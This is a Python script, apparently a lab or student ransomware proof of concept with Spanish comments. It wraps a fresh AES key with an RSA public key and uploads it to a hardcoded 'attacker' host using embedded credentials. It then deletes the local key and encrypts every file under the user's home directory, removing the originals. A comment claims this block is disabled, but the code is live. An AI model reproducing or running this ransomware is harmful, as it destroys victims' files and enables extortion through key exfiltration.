#!/usr/bin/python

"""
Referencias
http://stackoverflow.com/questions/5000946/how-to-generate-strong-one-time-session-key-for-aes-in-python
http://stackoverflow.com/questions/20852664/python-pycrypto-encrypt-decrypt-text-files-with-aes
http://pycryptodome.readthedocs.org/en/latest/src/examples.html
https://www.dlitz.net/software/pycrypto/api/current/Crypto.PublicKey.RSA-module.html
http://stackoverflow.com/questions/6886240/python-pycrypto-sending-encrypted-data-over-network
"""
import Crypto
import subirArchivo
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.PublicKey import RSA
from base64 import b64encode
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import binascii

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=128):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".enc", 'wb') as fo:
        fo.write(enc)
    os.remove(file_name)
	
def decrypt_file(file_name, key):
    print file_name
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4]+"dec", 'wb') as fo:
        fo.write(dec)
    os.remove(file_name)


opcion = raw_input("1.Cifrar \n2.Descifrar\n")

if opcion=="1":
#Para AES-128 la longitud de llave es de 16 bytes con urandom generamos una llave aleatoria 
    keyAES = os.urandom(16)
    keyAESB64 =  b64encode(keyAES)

#Cifrando la llave AES a RSA
    f = open('publicKey.pem','r')
    keyFile = RSA.importKey(f.read())
    f.close()
    cipher_rsa = PKCS1_OAEP.new(keyFile)
    keyRSA = b64encode(cipher_rsa.encrypt(keyAESB64))
    with open("llave.txt", 'w') as allave:
        allave.write(str(keyRSA))
    
    #Copiando el archivo al equipo atacante
    rutaAtacante = '/var/www/test_readwrite/llave.txt'
    rutaVictima = 'llave.txt'
    host = "192.168.235.150"
    username="emodulo"
    password="hola123,"
    subirArchivo.subir(rutaAtacante,rutaVictima,host,username,password)

    #Eliminando el archivo en el equipo de la victima
    try:
        os.remove(rutaVictima)
    except OSError:
        pass

#    encrypt_file('image.jpg', keyAES)

#Para evitar accidentes se comenta el siguiente bloque
    rutasArch = []
    homePath = os.getenv("HOME")
    for root, subFolders, files in os.walk(homePath):
        for names in files:
           rutasArch.append(os.path.join(root,names))
    for file in rutasArch:
	try:       	
            encrypt_file(file, keyAES)
	except:
	    pass

#Sobrescribiendo el valor de la llave AES para evitar que
#se quede guardada en memoria
    keyAES = ""    

elif opcion=="2":
    llaveAES = raw_input("Ingresa la llave privada AES: ")
    keyImport =  b64decode(llaveAES)
#    decrypt_file('image.jpg.enc', keyImport)

    rutasArch = []
    homePath = os.getenv("HOME")
    for root, subFolders, files in os.walk(homePath):
        for names in files:
           rutasArch.append(os.path.join(root,names))
    for file in rutasArch:
	try:
            decrypt_file(file, keyImport)
	except:
	    pass
    keyImport = ""

else:
    print "Error"

